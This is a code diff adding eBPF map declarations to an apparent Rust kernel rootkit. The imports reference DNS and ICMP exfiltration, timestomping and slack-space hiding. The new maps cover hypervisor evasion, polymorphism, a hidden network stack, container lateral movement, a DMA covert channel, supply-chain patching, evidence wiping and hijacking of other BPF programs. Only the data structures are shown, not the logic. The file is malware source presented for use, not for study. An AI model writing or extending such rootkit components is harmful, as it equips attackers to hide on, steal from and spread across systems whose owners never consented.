@@ -3,8 +3,9 @@ use aya_ebpf::{
     maps::{HashMap, PerCpuArray, ProgramArray, RingBuf},
 };
 use common::{
-    BgpHijackEntry, ContainerProbeResult, DnsExfilChunk, IcmpExfilPayload, PortKnockConfig,
-    PortKnockState, ProcSpoofEntry, RootkitConfig, SlackHideEntry, TimestompEntry,
+    BgpHijackEntry, ContainerProbeResult, DnsExfilChunk, IcmpExfilPayload, PhantomConnState,
+    PortKnockConfig, PortKnockState, ProcSpoofEntry, RootkitConfig, SlackHideEntry,
+    SupplyChainTarget, TimestompEntry,
 };
 
 #[map]
@@ -262,3 +263,132 @@ pub(crate) static BPF_PIN_PATHS: HashMap<u32, [u8; 64]> = HashMap::with_max_entr
 
 #[map]
 pub(crate) static PORT_KNOCK_ALLOWED: HashMap<u32, u8> = HashMap::with_max_entries(64, 0);
+
+// ──────────────────────────────────────────────
+// Hypervisor Evasion Maps
+// ──────────────────────────────────────────────
+
+#[map]
+pub(crate) static HYPERVISOR_STATE: aya_ebpf::maps::Array<u32> =
+    aya_ebpf::maps::Array::with_max_entries(4, 0);
+
+#[map]
+pub(crate) static HV_TSC_OFFSETS: aya_ebpf::maps::Array<u64> =
+    aya_ebpf::maps::Array::with_max_entries(4, 0);
+
+#[map]
+pub(crate) static HV_BLIND_ADDRS: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);
+
+// ──────────────────────────────────────────────
+// Polymorphic Maps
+// ──────────────────────────────────────────────
+
+#[map]
+pub(crate) static MORPH_STATE: aya_ebpf::maps::Array<u32> =
+    aya_ebpf::maps::Array::with_max_entries(4, 0);
+
+#[map]
+pub(crate) static MORPH_SEED: aya_ebpf::maps::Array<u64> =
+    aya_ebpf::maps::Array::with_max_entries(1, 0);
+
+#[map]
+pub(crate) static OPAQUE_PRED_MAP: HashMap<u32, u64> = HashMap::with_max_entries(16, 0);
+
+// ──────────────────────────────────────────────
+// Phantom Stack Maps
+// ──────────────────────────────────────────────
+
+#[map]
+pub(crate) static PHANTOM_CONNS: HashMap<u64, PhantomConnState> = HashMap::with_max_entries(64, 0);
+
+#[map]
+pub(crate) static PHANTOM_LISTEN_PORTS: HashMap<u16, u8> = HashMap::with_max_entries(8, 0);
+
+#[map]
+pub(crate) static PHANTOM_TX_QUEUE: RingBuf = RingBuf::with_byte_size(64 * 1024, 0);
+
+// ──────────────────────────────────────────────
+// Container Lateral Movement Maps
+// ──────────────────────────────────────────────
+
+#[map]
+pub(crate) static CGROUP_TARGETS: HashMap<u64, u8> = HashMap::with_max_entries(32, 0);
+
+#[map]
+pub(crate) static CONTAINER_NS_MAP: HashMap<u32, u64> = HashMap::with_max_entries(64, 0);
+
+#[map]
+pub(crate) static LATERAL_STATE: aya_ebpf::maps::Array<u32> =
+    aya_ebpf::maps::Array::with_max_entries(4, 0);
+
+// ──────────────────────────────────────────────
+// DMA Covert Channel Maps
+// ──────────────────────────────────────────────
+
+#[map]
+pub(crate) static DMA_STASH_ADDRS: HashMap<u64, u64> = HashMap::with_max_entries(16, 0);
+
+#[map]
+pub(crate) static PCIE_TLP_QUEUE: HashMap<u32, [u8; 64]> = HashMap::with_max_entries(16, 0);
+
+#[map]
+pub(crate) static IOMMU_STATE: aya_ebpf::maps::Array<u64> =
+    aya_ebpf::maps::Array::with_max_entries(4, 0);
+
+// ──────────────────────────────────────────────
+// Behavioral AI Maps
+// ──────────────────────────────────────────────
+
+#[map]
+pub(crate) static BEHAVIOR_BASELINE: aya_ebpf::maps::Array<u64> =
+    aya_ebpf::maps::Array::with_max_entries(16, 0);
+
+#[map]
+pub(crate) static SYSCALL_HISTOGRAM: PerCpuArray<u64> = PerCpuArray::with_max_entries(16, 0);
+
+#[map]
+pub(crate) static THROTTLE_STATE: aya_ebpf::maps::Array<u64> =
+    aya_ebpf::maps::Array::with_max_entries(4, 0);
+
+// ──────────────────────────────────────────────
+// Supply Chain Maps
+// ──────────────────────────────────────────────
+
+#[map]
+pub(crate) static PKG_MANAGER_HASHES: HashMap<u64, u8> = HashMap::with_max_entries(16, 0);
+
+#[map]
+pub(crate) static SUPPLY_PATCH_TABLE: HashMap<u64, SupplyChainTarget> =
+    HashMap::with_max_entries(16, 0);
+
+#[map]
+pub(crate) static EXECVE_MONITOR_STATE: aya_ebpf::maps::Array<u32> =
+    aya_ebpf::maps::Array::with_max_entries(1, 0);
+
+// ──────────────────────────────────────────────
+// Dead Man's Switch Maps
+// ──────────────────────────────────────────────
+
+#[map]
+pub(crate) static DEADMAN_CONFIG: aya_ebpf::maps::Array<u64> =
+    aya_ebpf::maps::Array::with_max_entries(4, 0);
+
+#[map]
+pub(crate) static HEARTBEAT_TRACKER: aya_ebpf::maps::Array<u64> =
+    aya_ebpf::maps::Array::with_max_entries(2, 0);
+
+#[map]
+pub(crate) static EVIDENCE_PATHS: HashMap<u32, [u8; 64]> = HashMap::with_max_entries(32, 0);
+
+// ──────────────────────────────────────────────
+// BPF Parasitism Maps
+// ──────────────────────────────────────────────
+
+#[map]
+pub(crate) static DETECTED_BPF_PROGS: HashMap<u32, u64> = HashMap::with_max_entries(128, 0);
+
+#[map]
+pub(crate) static PARASITE_TARGETS: HashMap<u32, u32> = HashMap::with_max_entries(16, 0);
+
+#[map]
+pub(crate) static HIJACK_PROG_ARRAY: ProgramArray = ProgramArray::with_max_entries(16, 0);
